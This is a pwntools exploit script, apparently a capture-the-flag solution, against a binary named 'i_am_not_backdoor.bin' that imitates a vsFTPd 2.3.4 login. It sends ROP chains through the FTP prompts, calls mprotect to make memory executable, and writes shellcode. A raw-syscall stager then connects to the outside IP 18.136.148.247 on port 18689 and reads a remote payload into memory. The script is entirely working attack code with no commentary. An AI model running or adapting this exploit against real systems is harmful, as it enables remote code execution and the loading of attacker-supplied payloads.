from pwn import *

e = context.binary = ELF("./i_am_not_backdoor.bin")
r = e.process()

rdi = 0x00000000004024b8
rsi = 0x00000000004097f2
rdx = 0x00000000004018e4
rax = 0x000000000042f8e7
xchg_edi_eax = 0x468446
mov_rdi_rax = 0x00000000004018de
mov_ptr_rsi_rdx = 0x46e622  # mov qword ptr [rsi], rdx ; ret
mov_ptr_rdi_rcx = 0x428f0c  # mov qword ptr [rdi + 0xf], rcx ; ret
rcx = 0x449ee3
bss = 0x4a6000
syscall = 0x4111d2
int_0x80 = bss + 0xf
pl = b'\0' * 8
pl += p64(rdi) + p64(bss) + p64(rcx) + p64(0x80cd) + p64(mov_ptr_rdi_rcx)
pl += p64(rsi) + p64(0x7000) + p64(rdx) + p64(7) + p64(e.sym.mprotect)
pl += p64(rdi) + p64(0x4a78e0) + p64(rcx) + \
    b"\x48\x81\xEC\x88\x01\x00\x00\xC3" + p64(mov_ptr_rdi_rcx)
pl += p64(0x4a78e0 + 0xf)
host = "18.136.148.247"
port = 18689
sock_addr = p16(2) + p16(port, endian='big') + binary_ip(host)
chain1 = p64(rax) + p64(0x29) + p64(rdi) + p64(2) + p64(rsi) + \
    p64(1) + p64(rdx) + p64(0) + p64(syscall)
chain1 += p64(0x00000000004018de) + p64(rax) + p64(0x2a)
chain1 += p64(rsi) + p64(0x4a7b90) + p64(rdx) + \
    sock_addr + p64(mov_ptr_rsi_rdx)
chain1 += p64(rdx) + p64(0x10) + p64(syscall)
chain1 += p64(xchg_edi_eax) + p64(rsi) + p64(bss) + \
    p64(rdx) + p64(0x10000) + p64(syscall)
r.sendafter(b'220 (vsFTPd 2.3.4)', chain1[128:256])


r.sendafter(b'password.', chain1[0:128])
pause()
r.sendafter(b'incorrect', pl)
r.interactive()
